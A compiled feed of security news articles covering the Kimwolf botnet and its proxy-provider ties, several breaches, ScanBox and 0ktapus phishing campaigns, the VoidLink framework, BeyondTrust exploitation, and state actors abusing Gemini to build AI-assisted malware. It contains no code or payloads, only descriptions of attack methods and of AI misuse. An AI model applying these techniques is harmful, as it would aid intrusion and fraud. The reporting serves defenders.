Hilariously, a user by the name “Richard Remington” briefly appeared in the group’s Telegram server to post a crude “Happy New Year” sketch that claims Dort and Snow are now in control of 3.5 million devices infected by Aisuru and/or Kimwolf. Richard Remington’s Telegram account has since been deleted, but it previously stated its owner operates a website that caters to DDoS-for-hire or “stresser” services seeking to test their firepower.

BYTECONNECT, PLAINPROXIES, AND 3XK TECH

Reports from both Synthient and XLab found that Kimwolf was used to deploy programs that turned infected systems into Internet traffic relays for multiple residential proxy services. Among those was a component that installed a software development kit (SDK) called ByteConnect, which is distributed by a provider known as Plainproxies.

ByteConnect says it specializes in “monetizing apps ethically and free,” while Plainproxies advertises the ability to provide content scraping companies with “unlimited” proxy pools. However, Synthient said that upon connecting to ByteConnect’s SDK they instead observed a mass influx of credential-stuffing attacks targeting email servers and popular online websites.

A search on LinkedIn finds the CEO of Plainproxies is Friedrich Kraft, whose resume says he is co-founder of ByteConnect Ltd. Public Internet routing records show Mr. Kraft also operates a hosting firm in Germany called 3XK Tech GmbH. Mr. Kraft did not respond to repeated requests for an interview.

In July 2025, Cloudflare reported that 3XK Tech (a.k.a. Drei-K-Tech) had become the Internet’s largest source of application-layer DDoS attacks. In November 2025, the security firm GreyNoise Intelligence found that Internet addresses on 3XK Tech were responsible for roughly three-quarters of the Internet scanning being done at the time for a newly discovered and critical vulnerability in security products made by Palo Alto Networks.

Source: Cloudflare’s Q2 2025 DDoS threat report.

LinkedIn has a profile for another Plainproxies employee, Julia Levi, who is listed as co-founder of ByteConnect. Ms. Levi did not respond to requests for comment. Her resume says she previously worked for two major proxy providers: Netnut Proxy Network, and Bright Data.

Synthient likewise said Plainproxies ignored their outreach, noting that the Byteconnect SDK continues to remain active on devices compromised by Kimwolf.

A post from the LinkedIn page of Plainproxies Chief Revenue Officer Julia Levi, explaining how the residential proxy business works.

Synthient’s January 2 report said another proxy provider heavily involved in the sale of Kimwolf proxies was Maskify, which currently advertises on multiple cybercrime forums that it has more than six million residential Internet addresses for rent.

Maskify prices its service at a rate of 30 cents per gigabyte of data relayed through their proxies. According to Synthient, that price range is insanely low and is far cheaper than any other proxy provider in business today.

“Synthient’s Research Team received screenshots from other proxy providers showing key Kimwolf actors attempting to offload proxy bandwidth in exchange for upfront cash,” the Synthient report noted. “This approach likely helped fuel early development, with associated members spending earnings on infrastructure and outsourced development tasks. Please note that resellers know precisely what they are selling; proxies at these prices are not ethically sourced.”

Maskify did not respond to requests for comment.

Hours after our first Kimwolf story was published last week, the resi[.]to Discord server vanished, Synthient’s website was hit with a DDoS attack, and the Kimwolf botmasters took to doxing Brundage via their botnet.

The harassing messages appeared as text records uploaded to the Ethereum Name Service (ENS), a distributed system for supporting smart contracts deployed on the Ethereum blockchain. As documented by XLab, in mid-December the Kimwolf operators upgraded their infrastructure and began using ENS to better withstand the near-constant takedown efforts targeting the botnet’s control servers.

An ENS record used by the Kimwolf operators taunts security firms trying to take down the botnet’s control servers. Image: XLab.

By telling infected systems to seek out the Kimwolf control servers via ENS, even if the servers that the botmasters use to control the botnet are taken down the attacker only needs to update the ENS text record to reflect the new Internet address of the control server, and the infected devices will immediately know where to look for further instructions.

“This channel itself relies on the decentralized nature of blockchain, unregulated by Ethereum or other blockchain operators, and cannot be blocked,” XLab wrote.

The text records included in Kimwolf’s ENS instructions can also feature short messages, such as those that carried Brundage’s personal information. Other ENS text records associated with Kimwolf offered some sage advice: “If flagged, we encourage the TV box to be destroyed.”

An ENS record tied to the Kimwolf botnet advises, “If flagged, we encourage the TV box to be destroyed.”

Both Synthient and XLabs say Kimwolf targets a vast number of Android TV streaming box models, all of which have zero security protections, and many of which ship with proxy malware built in. Generally speaking, if you can send a data packet to one of these devices you can also seize administrative control over it.

If you own a TV box that matches one of these model names and/or numbers, please just rip it out of your network. If you encounter one of these devices on the network of a family member or friend, send them a link to this story (or to our January 2 story on Kimwolf) and explain that it’s not worth the potential hassle and harm created by keeping them plugged in.

[10] Threatpost - Student Loan Breach Exposes 2.5M Records
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 31 Aug 2022 12:57:48 +0000
Link: https://threatpost.com/student-loan-breach-exposes-2-5m-records/180492/

[TAM METİN - 511 kelime]
2.5 million people were affected, in a breach that could spell more trouble down the line.

EdFinancial and the Oklahoma Student Loan Authority (OSLA) are notifying over 2.5 million loanees that their personal data was exposed in a data breach.

The target of the breach was Nelnet Servicing, the Lincoln, Neb.-based servicing system and web portal provider for OSLA and EdFinancial, according to a breach disclosure letter.

Nelnet revealed the breach to affected loan recipients on July 21, 2022 via a letter.

“[Our] cybersecurity team took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched[sic] an investigation with third-party forensic experts to determine the nature and scope of the activity,” according to the letter.

By August 17th, the investigation determined that personal user information was accessed by an unauthorized party. That exposed information included names, home addresses, email addresses, phone numbers and social security numbers for a total of 2,501,324 student loan account holders. Users’ financial information was not exposed.

According to a breach disclosure filing submitted by Nelnet’s general counsel, Bill Munn, to the state of Maine the breach occurred sometime between June 1, 2022 and July 22, 2022. However, a letter to affected customers pinpoints the breach to July 21. The breach was discovered on August 17, 2022.

“On July 21, 2022, Nelnet Servicing, LLC (Nelnet), our servicing system and customer website

portal provider, notified us that they had discovered a vulnerability that we believe led to this incident,” according to the Nelnet.

It’s unclear what the vulnerability was.

“On August 17, 2022, this investigation determined that certain student loan account registration information was accessible by an unknown party beginning in June 2022 and ending on July 22, 2022,” according to the letter.

Loan Recipient Targets

Although users’ most sensitive financial data was protected, the personal information that was accessed in the Nelnet breach “has potential to be leveraged in future social engineering and phishing campaigns,” explained Melissa Bischoping, endpoint security research specialist at Tanium, in a statement via email.

“With recent news of student loan forgiveness, it’s reasonable to expect the occasion to be used by scammers as a gateway for criminal activity,” Bischoping said.

Last week, the Biden administration announced a plan to cancel $10,000 of student loan debt for low- and middle-income loanees. She said the loan forgiveness program will be used to lure victims into opening up phishing emails.

She warns that recently breached data will be used to impersonate affected brands in waves of phishing campaigns targeting students and recent college graduates.

“Because they can leverage the trust from existing business relationships they can be particularly deceptive,” she wrote.

According to the breach disclosure Nelnet Servicing informed Edfinancial and OSLA that Nelnet Servicing’s cybersecurity team “took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched an investigation with third-party forensic experts to determine the nature and scope of the activity.”

Remediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.

[11] Threatpost - Watering Hole Attacks Push ScanBox Keylogger
────────────────────────────────────────────────────────────────────────────────
Tarih: Tue, 30 Aug 2022 16:00:43 +0000
Link: https://threatpost.com/watering-hole-attacks-push-scanbox-keylogger/180490/

[TAM METİN - 918 kelime]
Researchers uncover a watering hole attack likely carried out by APT TA423, which attempts to plant the ScanBox JavaScript-based reconnaissance tool.

A China-based threat actor has ramped up efforts to distribute the ScanBox reconnaissance framework to victims that include domestic Australian organizations and offshore energy firms in the South China Sea. The bait used by the advanced threat group (APT) is targeted messages that supposedly link back to Australian news websites.

The cyber-espionage campaigns are believed to have launched April 2022 through mid-June 2022, according to a Tuesday report by Proofpoint’s Threat Research Team and PwC’s Threat Intelligence team.

The threat actor, according to researchers, is believed to be the China-based APT TA423, also known as Red Ladon. “Proofpoint assesses with moderate confidence that this activity may be attributable to the threat actor TA423 / Red Ladon, which multiple reports assess to operate out of Hainan Island, China,” according to the report.

The APT is most recently known for a recent indictment. “A 2021 indictment by the US Department of Justice assessed that TA423 / Red Ladon provides long-running support to the Hainan Province Ministry of State Security (MSS),” researchers said.

MSS is the civilian intelligence, security and cyber police agency for the People’s Republic of China. It is believed responsible for counter-intelligence, foreign intelligence, political security and tied to industrial and cyber espionage efforts by China.

Dusting Off the ScanBox

The campaign leverages the ScanBox framework. ScanBox is a customizable and multifunctional Javascript-based framework used by adversaries to conducting covert reconnaissance.

ScanBox has been used by adversaries for nearly a decade and is noteworthy because criminals can use the tool to conduct counter intelligence without having to plant malware on a targets system.

“ScanBox is particularly dangerous as it doesn’t require malware to be successfully deployed to disk in order to steal information – the keylogging functionality simply requires the JavaScript code to be executed by a web browser,” according to PwC researchers referring to a previous campaign.

In lieu of malware, attackers can use ScanBox in conjunction with watering hole attacks. Adversaries load the malicious JavaScript onto a compromised website where the ScanBox acts as a keylogger snagging all of a user’s typed activity on the infected watering hole website.

TA423’s attacks began with phishing emails, with such titles as “Sick Leave,” “User Research” and “Request Cooperation.” Often, the emails purported to come from an employee of the “Australian Morning News,” a fictional organization. The employee implored targets to visit their “humble news website,” australianmorningnews[.]com.

“Upon clicking the link and redirecting to the site, visitors were served the ScanBox framework,” researchers wrote.

The link directed targets to a web page with content copied from actual news sites, like the BBC and Sky News. In the process, it also delivered the ScanBox malware framework.

ScanBox keylogger data culled from waterholes is part of a multi-stage attack, giving attackers insight into the potential targets that will help them launch future attacks against them. This technique is often called browser fingerprinting.

The primary, initial script sources a list of information about the target computer, including the operating system, language and version of Adobe Flash installed. ScanBox additionally runs a check for browser extensions, plugins and components such WebRTC.

“The module implements WebRTC, a free and open-source technology supported on all major browsers, which allows web browsers and mobile applications to perform real-time communication (RTC) over application programming interfaces (APIs). This allows ScanBox to connect to a set of pre-configured targets,” researchers explain.

Adversaries can then leverage a technology called STUN (Session Traversal Utilities for NAT). This is a standardized set of methods, including a network protocol, that allows interactive communications (including real-time voice, video, and messaging applications) to traverse network address translator (NAT) gateways, researchers explain.

“STUN is supported by the WebRTC protocol. Through a third-party STUN server located on the Internet, it allows hosts to discover the presence of a NAT, and to discover the mapped IP address and port number that the NAT has allocated for the application’s User Datagram Protocol (UDP) flows to remote hosts. ScanBox implements NAT traversal using STUN servers as part of Interactive Connectivity Establishment (ICE), a peer-to-peer communication method used for clients to communicate as directly as possible, avoiding having to communicate through NATs, firewalls, or other solutions,” according to researchers.

“This means that the ScanBox module can set up ICE communications to STUN servers, and communicate with victim machines even if they are behind NAT,” they explain.

The threat actors “support the Chinese government in matters related to the South China Sea, including during the recent tensions in Taiwan,” Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, explained in a statement, “This group specifically wants to know who is active in the region and, while we can’t say for certain, their focus on naval issues is likely to remain a constant priority in places like Malaysia, Singapore, Taiwan, and Australia.”

The group has, in the past, expanded well beyond Australasia. According to a Department of Justice indictment from July, 2021, the group has “stolen trade secrets and confidential business information” from victims in “the United States, Austria, Cambodia, Canada, Germany, Indonesia, Malaysia, Norway, Saudi Arabia, South Africa, Switzerland and the United Kingdom. Targeted industries included, among others, aviation, defense, education, government, health care, biopharmaceutical and maritime.”

Despite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”

[12] Threatpost - Tentacles of ‘0ktapus’ Threat Group Victimize 130 Firms
────────────────────────────────────────────────────────────────────────────────
Tarih: Mon, 29 Aug 2022 14:56:19 +0000
Link: https://threatpost.com/0ktapus-victimize-130-firms/180487/

[TAM METİN - 614 kelime]
Over 130 companies tangled in sprawling phishing campaign that spoofed a multi-factor authentication system.

Targeted attacks on Twilio and Cloudflare employees are tied to a massive phishing campaign that resulted in 9,931 accounts at over 130 organizations being compromised. The campaigns are tied to focused abuse of identity and access management firm Okta, which gained the threat actors the 0ktapus moniker, by researchers.

“The primary goal of the threat actors was to obtain Okta identity credentials and multi-factor authentication (MFA) codes from users of the targeted organizations,” wrote Group-IB researchers in a recent report. “These users received text messages containing links to phishing sites that mimicked the Okta authentication page of their organization.”

Impacted were 114 US-based firms, with additional victims of sprinkled across 68 additional countries.

Roberto Martinez, senior threat intelligence analyst at Group-IB, said the scope of the attacks is still an unknown. “The 0ktapus campaign has been incredibly successful, and the full scale of it may not be known for some time,” he said.

What the 0ktapus Hackers Wanted

The 0ktapus attackers are believed to have begun their campaign by targeting telecommunications companies in hopes of winning access to potential targets’ phone numbers.

While unsure exactly how threat actors obtained a list of phone numbers used in MFA-related attacks, one theory researchers posit is that 0ktapus attackers began their campaign targeting telecommunications companies.

“[A]ccording to the compromised data analyzed by Group-IB, the threat actors started their attacks by targeting mobile operators and telecommunications companies and could have collected the numbers from those initial attacks,” researchers wrote.

Next, attackers sent phishing links to targets via text messages. Those links led to webpages mimicking the Okta authentication page used by the target’s employer. Victims were then asked to submit Okta identity credentials in addition to a multi-factor authentication (MFA) codes employees used to secure their logins.

In an accompanying technical blog, researchers at Group-IB explain that the initial compromises of mostly software-as-a-service firms were a phase-one in a multi-pronged attack. 0ktapus’ ultimate goal was to access company mailing lists or customer-facing systems in hopes of facilitating supply-chain attacks.

In a possible related incident, within hours of Group-IB publishing its report late last week, the firm DoorDash revealed it was targeted in an attack with all the hallmarks of an 0ktapus-style attack.

Blast Radius: MFA Attacks

In a blog post DoorDash revealed; “unauthorized party used the stolen credentials of vendor employees to gain access to some of our internal tools.” The attackers, according to the post, went on to steal personal information – including names, phone numbers, email and delivery addresses – from customers and delivery people.

In the course of its campaign, the attacker compromised 5,441 MFA codes, Group-IB reported.

“Security measures such as MFA can appear secure… but it is clear that attackers can overcome them with relatively simple tools,” researchers wrote.

“This is yet another phishing attack showing how easy it is for adversaries to bypass supposedly secure multifactor authentication,” Roger Grimes, data-driven defense evangelist at KnowBe4, wrote in a statement via email. “It simply does no good to move users from easily phish-able passwords to easily phish-able MFA. It’s a lot of hard work, resources, time, and money, not to get any benefit.”

To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene around URLs and passwords, and using FIDO2-compliant security keys for MFA.

“Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”

[13] Security Affairs - New threat actor UAT-9921 deploys VoidLink against enterprise sectors
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 22:18:18 +0000

[TAM METİN - 583 kelime]
Cisco Talos spotted a previously unknown threat actor, tracked as UAT-9921, using a new modular attack framework called VoidLink. The group targets organizations in the technology and financial services sectors. The flexible design of VoidLink suggests the actor can adapt tools and techniques to different victims and campaign needs.

“Cisco Talos recently discovered a new threat actor, UAT-9921, leveraging VoidLink in campaigns. Their activities may go as far back as 2019, even without VoidLink. The VoidLink compile-on-demand feature lays down the foundations for AI-enabled attack frameworks, which can create tools on-demand for their operators.” reads the report published by Talos. “Cisco Talos found clear indications that implants also exist for Windows, with the capability to load plugins.”

VoidLink is a new modular Linux-focused attack framework first spotted by Check Point and used by threat actor UAT-9921, which has been active since at least 2019.

“Talos is aware of multiple VoidLink-related victims dating back to September with the activity continuing through to January 2026.” continues the report. “This finding does not necessarily contradict the Checkpoint Research mentions of late November since the presented documents show development dates from version 2.0 and Cisco Talos assesses that this was still version 1.0.”

The group installs VoidLink on compromised servers to establish command-and-control, hide activity, and scan networks internally and externally. Talos assesses that the actor likely has Chinese-language knowledge and that VoidLink development appears to be supported by AI-enabled coding tools, though operations do not rely on AI. UAT-9921 gains access using stolen credentials or by exploiting Java serialization flaws such as Apache Dubbo. Victims include technology and financial firms, but broad network scanning suggests opportunistic targeting.

Since 2022, Cisco Talos has tracked fast-evolving single-file attack frameworks like Manjusaka and Alchimist. VoidLink marks a major step forward, keeping the single-file model but delivering a more advanced, “defense-contractor grade” implant platform. Built quickly with AI-enabled development tools, it combines Zig for implants, C for plugins, and Go for the backend, and can compile plugins on demand for different Linux targets.

Talos warns this model could soon support AI-driven tool creation, where implants request custom exploits or modules from C2 servers in real time. This would speed lateral movement, enable unique attack tools, and make detection far harder.

“Of course, this may just be an intermediate step, assuming that there is a human operator managing the environment exploration. However, it likely will not be long before we begin to uncover malicious agents doing the initial stages of exploration and lateral movement before human intervention.” continues the report.

“This has an impact of reducing compromise attack metrics — namely, the time to lateral movement and time to focused data exfiltration. It also allows the generation of never-before-seen tools and the constant change in the attacker’s behavior, making detection more difficult.”

Talos researchers states that VoidLink stands out as a “defense contractor–grade” framework with built-in auditing and role-based access control (SuperAdmin, Operator, Viewer). Its mesh peer-to-peer design lets implants relay traffic for one another, bypassing network limits. The malware is focused on Linux, and implements advanced capabilities such as eBPF/LKM rootkits, container escape, privilege escalation, cloud awareness, and EDR evasion. Though mainly Linux-based, evidence suggests possible Windows support. With modular plugins, stealth, and anti-analysis features, VoidLink shows strong potential to evolve into a highly powerful attack platform.

“VoidLink is positioned to become an even more powerful framework based on its capabilities and flexibility, as demonstrated through this apparent proof of concept.”

[14] Security Affairs - Attackers exploit BeyondTrust CVE-2026-1731 within hours of PoC release
────────────────────────────────────────────────────────────────────────────────

Link: https://securityaffairs.com/187962/uncategorized/attackers-exploit-beyondtrust-cve-2026-1731-within-hours-of-poc-release.html

[TAM METİN - 509 kelime]
Threat actors rapidly began exploiting a newly patched BeyondTrust vulnerability, tracked as CVE-2026-1731 (CVSS score of 9.9), soon after a proof-of-concept exploit became public.

This week BeyondTrust released security updates to address the critical flaw in its Remote Support and older Privileged Remote Access products. The bug could allow an unauthenticated attacker to send specially crafted requests and run operating system commands remotely, without logging in. The issue, disclosed on February 6, 2026, could lead to full remote code execution if exploited, making the updates essential to prevent abuse.

“BeyondTrust Remote Support (RS) and certain older versions of Privileged Remote Access (PRA) contain a critical pre-authentication remote code execution vulnerability.” reads the advisory. “By sending specially crafted requests, an unauthenticated remote attacker may be able to execute operating system commands in the context of the site user.”

Exploiting the flaw would let a remote attacker run system commands without authentication or user interaction, potentially leading to full system compromise, data theft, and service disruption.

”Successful exploitation could allow an unauthenticated remote attacker to execute operating system commands in the context of the site user.” continues the advisory. “Successful exploitation requires no authentication or user interaction and may lead to system compromise, including unauthorized access, data exfiltration, and service disruption.”

BeyondTrust released patches for CVE-2026-1731 on February 6 after Hacktron researchers warned that about thousands of instances were exposed online.

Hacktron AI team reported that roughly 11,000 BeyondTrust Remote Support instances are exposed online across cloud and on-prem environments. Around 8,500 of these are on-prem systems and could remain vulnerable if not patched. The affected deployments are mainly used by large organizations, including enterprises in healthcare, financial services, government, and hospitality sectors.

After a PoC exploit went public on February 10, GreyNoise detected attack attempts within 24 hours, with one IP responsible for most reconnaissance activity.

“On February 10, a proof-of-concept exploit for CVE-2026-1731, a critical pre-authentication remote code execution vulnerability in BeyondTrust Remote Support and Privileged Remote Access, was posted to GitHub. By February 11, GreyNoise’s Global Observation Grid was recording reconnaissance probing for vulnerable BeyondTrust instances.” reported GreyNoise.

GreyNoise observed rapid reconnaissance for CVE-2026-1731, led by a single IP responsible for 86% of scans. The activity comes from a long-running scanning operation using a commercial VPN and Linux-based tooling. Threat actors mainly probe non-standard ports, suggesting they know enterprises move BeyondTrust services off 443. JA4+ fingerprints show shared exploit tools and VPN tunneling.

The same IPs also target SonicWall, MOVEit, Log4j, Sophos, SSH, and IoT devices, showing multi-exploit behavior. BeyondTrust tools are high-value targets, and past zero-day chains remain active even as new variants quickly emerge.

“The IPs performing reconnaissance for CVE-2026-1731 aren’t single-purpose. While their BeyondTrust activity is a check (enumeration), their GreyNoise profiles show they’re simultaneously conducting active exploitation attempts against other products: SonicWall, MOVEit Transfer, Log4j, Sophos firewalls, SSH brute-forcing, and IoT default-credential testing.” concludes the report. “Some IPs are even using out-of-band callback domains (OAST), a more sophisticated technique to confirm vulnerability before delivering payloads.”

[15] Security Affairs - Google: state-backed hackers exploit Gemini AI for cyber recon and attacks
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 639 kelime]
Google DeepMind and GTIG report a rise in model extraction or “distillation” attacks aimed at stealing AI intellectual property, which Google has detected and blocked. While APT groups have not breached frontier models, private firms and researchers have tried to clone proprietary systems. State-backed actors from North Korea, Iran, China, and Russia use AI for research, targeting, and phishing. Threat actors also test agentic AI, AI-powered malware like HONESTCUE, and underground “jailbreak” services.

Threat actors now use large language models to craft polished, culturally accurate phishing messages that remove common red flags like poor grammar. They also run “rapport-building” phishing, holding realistic multi-step conversations to gain trust before delivering malware.

Google reported that North Korea-linked hacker group UNC2970 used its Gemini AI model to gather intelligence on targets and support cyber operations. The company also said other threat groups now weaponize generative AI to speed up attack stages, run information operations, and even attempt model extraction attacks.

“The North Korean government-backed actor UNC2970 has consistently focused on defense targeting and impersonating corporate recruiters in their campaigns. The group used Gemini to synthesize OSINT and profile high-value targets to support campaign planning and reconnaissance.” reads the report published by Google. “This actor’s target profiling included searching for information on major cybersecurity and defense companies and mapping specific technical job roles and salary information. “

Iran-linked group APT42 also used generative AI tools like Gemini to boost reconnaissance and targeted social engineering. The group searched for official email addresses, researched organizations to build believable pretexts, and created tailored personas based on target biographies. The nation-state actor also used AI for language translation and understanding local context. Google disrupted the activity and disabled related assets.

In September 2025, Google tracked new malware called HONESTCUE that uses the Gemini API to generate malicious C# code on demand. Instead of storing full payloads, the malware sends prompts to Gemini, receives source code for a second-stage downloader, compiles it in memory with .NET tools, and executes it without writing files to disk. This fileless approach helps evade detection. Attackers also host payloads on platforms like Discord CDN. Researchers believe a single actor or small group is testing this AI-assisted malware as a proof of concept.

In November 2025, GTIG found COINBAIT, a phishing kit built with help from AI. It pretends to be a major crypto exchange to steal login details. Some of the activity links to UNC5356, a group known for SMS and phone phishing. The kit was likely created using Lovable AI and built as a complex React website. It includes detailed “? Analytics:” logs that show how it tracks and steals data. The attackers hid their systems behind Cloudflare and trusted services to avoid detection. COINBAIT shows a move toward modern web tools and cloud services, may be used by different groups, and also connects to AI-hosted ClickFix scams that trick users into installing malware like ATOMIC.

Underground forums show strong demand for AI tools built for cybercrime. Since most threat actors cannot build their own models, they rely on established services like Gemini. One example, Xanthorox, claimed to be a private custom AI for malware and phishing, but it actually ran on commercial and open-source AI tools layered together.

Attackers need stolen API keys to scale abuse, creating risks for organizations using cloud AI services. Criminals often exploit weak security in open-source AI platforms to steal and resell API keys, fueling a black market.

Google disabled accounts linked to this abuse and continues strengthening safeguards, threat detection, red teaming, and secure AI development through frameworks like SAIF and research projects such as Big Sleep and CodeMender.

“The potential of AI, especially generative AI, is immense. As innovation moves forward, the industry needs security standards for building and deploying AI responsibly.” concludes Google.

[17] Graham Cluley - Polish hacker charged seven years after massive Morele.net data breach
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 08:04:15 +0000
Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/polish-hacker-charged-seven-years-after-massive-morele-net-data-breach

[TAM METİN - 409 kelime]
A 29-year-old Polish man has been charged in connection with a data breach that exposed the personal details of around 2.5 million customers of the popular Polish e-commerce website Morele.net.

Poland's Central Cybercrime Bureau (CBZC) announced that charges were filed on 30 January 2026, following years of investigation into the 2018 breach of Morele.net, that specialises in electronics, computer equipment and home appliances.

The high-profile breach of Morele.net, whose international equivalents include the likes of Best Buy, Newegg, and Amazon, sent shockwaves through Poland's online retail sector.

The investigation into the data breach had originally been shelved after police failed to identify a suspect, but authorities claim that the trail never went entirely cold.

Over time investigators identified the attack vector, reconstructed the sequence of events, and traced digital breadcrumbs back to the alleged hacker - demonstrating their determination in a YouTube video.

According to a CBZC press release, the suspect has admitted responsibility for the hack.

The cyber attack exposed names, email addresses, phone numbers, home addresses, and md5crypt-hashed passwords. Although payment card details were not compromised in the breach, it was reported that some 35,000 customers did have particularly sensitive information stolen, including national ID numbers, financial details, education information, income, and marital status.

Morele.net refused to pay a ransom, and the breached database was published online.

Unfortunately for the site's users who had their information breached, fraudsters weaponised the stolen data immediately. Victims reported receiving SMS messages demanding payment of 1 Polish zloty to "complete" their orders, accompanied by phishing links that stole banking credentials.

In 2019, in what was one of the country's largest GDPR-related fines at the time, Poland's data protection authority regulator hit Morele.net to the tune of €645,000, claiming that had failed to detect and respond to unusual network traffic.

Morele.net contested the fine, arguing that its security measures were reasonable even if they ultimately proved insufficient against a determined attacker, and eventually Poland's Supreme Administrative Court annulled the penalty, saying it had finding deficiencies in the regulator's justification and calculation of the fine.

Now, however, it is the alleged hacker who will be hoping he can escape receiving a heavy punishment.

If anything, this case serves as a timely reminder to cybercriminals that they should not assume that they have evaded justice just because years have passed since their offence. Digital forensics techniques continue to improve, and law enforcement agencies are increasingly willing to pursue cold cases when new leads emerge.

AI bots are having existential crises, inventing religions, and allegedly plotting against humanity… or so the internet would have you believe.

We dig into Moltbook, the “AI-only” social network that sent Twitter into a meltdown, attracted breathless talk of the singularity, and turned out to be far less Terminator and far more humans role-playing as bots.

Plus we discuss why “vibe coding” your app might be a catastrophically bad idea, when security researchers can easily peek inside rifle through your private messages, API keys, and databases.

Also this week we learn that pro-Russian hackers are circling the Winter Olympics – or is it the Jamaican Bobsleigh team?

All this and more is discussed in episode 454 of the “Smashing Security” podcast with cybersecurity veteran Graham Cluley, and special guest Iain Thomson.

[19] SANS ISC - AI-Powered Knowledge Graph Generator &#x26; APTs, (Thu, Feb 12th)
────────────────────────────────────────────────────────────────────────────────

AI-Powered Knowledge Graph Generator & APTs

Unstructured text to interactive knowledge graph via LLM & SPO triplet extraction

Courtesy of TLDR InfoSec Launches & Tools again, another fine discovery in Robert McDermott’s AI Powered Knowledge Graph Generator. Robert’s system takes unstructured text, uses your preferred LLM and extracts knowledge in the form of Subject-Predicate-Object (SPO) triplets, then visualizes the relationships as an interactive knowledge graph.[1]

Robert has documented AI Powered Knowledge Graph Generator (AIKG) beautifully, I’ll not be regurgitating it needlessly, so please read further for details regarding features, requirements, configuration, and options. I will detail a few installation insights that got me up and running quickly.
The feature summary is this:
AIKG automatically splits large documents into manageable chunks for processing and uses AI to identify entities and their relationships. As AIKG ensures consistent entity naming across document chunks, it discovers additional relationships between disconnected parts of the graph, then creates an interactive graph visualization. AIKG works with any OpenAI-compatible API endpoint; I used Ollama exclusively here with Google’s Gemma 3, a lightweight family of models built on Gemini technology. Gemma 3 is multimodal, processing text and images, and is the current, most capable model that runs on a single GPU. I ran my experimemts on a Lenovo ThinkBook 14 G4 circa 2022 with an AMD Ryzen 7 5825U 8-core processor, Radeon Graphics, and 40gb memory running Ubuntu 24.04.3 LTS.
My installation guidelines assume you have a full instance of Python3 and Ollama installed. My installation was implemented under my tools directory.

I opted to test AIKG via a couple of articles specific to Russian state-sponsored adversarial cyber campaigns as input:

CISA’s Cybersecurity Advisory Russian GRU Targeting Western Logistics Entities and Technology Companies May 2025

SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities January 2026

My use of these articles in particular was based on the assertion that APT and nation state activity is often well represented via interactive knowledge graph. I’ve advocated endlessly for visual link analysis and graph tech, including Maltego (the OG of knowledge graph tools) at far back as 2009, Graphviz in 2015, GraphFrames in 2018 and Beagle in 2019. As always, visualization, coupled with entity relationship mappings, are an imperative for security analysts, threat hunters, and any security professional seeking deeper and more meaningful insights. While the SecurityWeek piece is a bit light on content and density, it served well as a good initial experiment.
The CISA advisory is much more dense and served as an excellent, more extensive experiment.
I pulled them both into individual text files more easily ingested for processing with AIKG, shared for you here if you’d like to play along at home.

Starting with SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities, and the subsequent Russia-APT28-targeting.txt file I created for model ingestion, I ran Gemma 3 as a 12 billion parameter model as follows:

You may want or need to run Gemma 3 with fewer parameters depending on the performance and capabilities of your local system. Note that I am calling file paths rather explicitly to overcome complaints about missing config and input files.
The article makes reference to APT credential harvesting activity targeting people associated with a Turkish energy and nuclear research agency, as well as a spoofed OWA login portal containing Turkish-language text to target Turkish scientists and researchers. As part of it’s use of semantic triples (Subject-Predicate-Object (SPO) triplets), how does AIKG perform linking entities, attributes and values into machine readable statements [2] derived from the article content, as seen in Figure 1?

Figure 1: AIKG Gemma 3:12b result from SecurityWeek article

Quite well, I’d say. To manipulate the graph, you may opt to disable physics in the graph output toolbar so you can tweak node placements. As drawn from the statistics view for this graph, AIKG generated 38 nodes, 105 edges, 52 extracted edges, 53 inferred edges, and four communities. You can further filter as you see fit, but even unfiltered, and with just a little by of tuning at the presentation layer, we can immediately see success where semantic triples immediately emerge to excellent effect. We can see entity/relationship connections where, as an example, threat actor –> targeted –> people and people –> associated with –> think tanks, with direct reference to the aforementioned OWA portal and Turkish language. If you’re a cyberthreat intelligence analyst (CTI) or investigator, drawing visual conclusions derived from text processing will really help you step up your game in the form of context and enrichment in report writing. This same graph extends itself to represent the connection between the victims and the exploitation methods and infrastructure. If you don’t want to go through a full installation process for yourself to complete your own model execution, you should still grab the JSON and HTML output files and experiment with them in your browser. You’ll get a real sense of the power and impact of an interactive knowledge graph with the joint forces power of LLM and SPO triplets.
For a second experiment I selected related content in a longer, more in depth analysis courtesy of a CISA Cybersecurity Advisory (CISA friends, I’m pulling for you in tough times). If you are following along at home, be sure to exit ollama so you can rerun it with additional parameters (27b vs 12b); pass /bye as a message, and restart:

Given the density and length of this article, the graph as initially rendered is a bit untenable (no fault of AIKG) and requires some tuning and filtering for optimal effect. Graph Statistics for this experiment included 118 nodes, 486 edges, 152 extracted edges, 334 inferred edges, and seven communities. To filter, with a focus again on actions taken by Russian APT operatives, I chose as follows:

Select a Node by ID: threat actors

Select a network item: Nodes

Select a property: color

Select value(s): #e41a1c (red)

The result is more visually feasible, and allows ready tweaking to optimize network connections, as seen in Figure 2.

Figure 2: AIKG Gemma 3:27b result from CISA advisory

